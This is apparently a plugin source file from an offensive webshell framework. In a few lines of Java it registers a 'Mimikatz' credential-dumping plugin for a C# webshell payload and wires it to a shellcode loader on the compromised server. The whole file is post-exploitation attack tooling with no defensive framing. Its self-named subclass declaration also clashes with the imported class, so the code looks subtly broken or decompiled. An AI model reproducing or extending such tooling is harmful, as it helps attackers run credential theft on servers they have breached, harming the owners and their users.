package shells.plugins.cshap;

import core.annotation.PluginAnnotation;
import shells.plugins.generic.Mimikatz;
import shells.plugins.generic.ShellcodeLoader;

@PluginAnnotation(payloadName = "CShapDynamicPayload", Name = "Mimikatz", DisplayName = "Mimikatz")
public class Mimikatz extends Mimikatz {
  protected ShellcodeLoader getShellcodeLoader() {
    return (ShellcodeLoader)this.shellEntity.getFrame().getPlugin("ShellcodeLoader");
  }
}
